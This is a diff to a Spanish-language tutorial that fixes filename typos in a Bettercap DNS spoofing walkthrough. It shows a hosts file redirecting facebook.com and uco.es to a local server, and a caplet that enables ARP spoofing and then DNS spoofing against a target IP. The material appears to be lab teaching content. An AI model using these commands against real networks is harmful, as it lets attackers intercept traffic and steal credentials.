@@ -137,7 +137,7 @@ Para realizar un ataque de DNS spoofing con Bettercap, en primer lugar necesitam
 	10.0.2.15 facebook.com
 	10.0.2.15  uco.es
 ```
-[hostsSpooging]()
+[hostsSpoofing]()
 
 De esta forma cualquier petición hacia estas direcciones será automaticamente redirigida a nuestro servidor. Posteriormente tendremos que realizar el caplet para ejecutar con Bettercap.
 
@@ -157,7 +157,7 @@ Previamente a relaizar este ataque tendremos que haber realizado un arp spoofing
 ```dnsSpooging.cap
 	arp.spoof.targets 10.0.2.15
 	arp.spoof on
-	set dns.spoof.hotst ./hostsDns¡
+	set dns.spoof.hotst ./hostsSpoofing
 	dns.spoof on
 
 ```
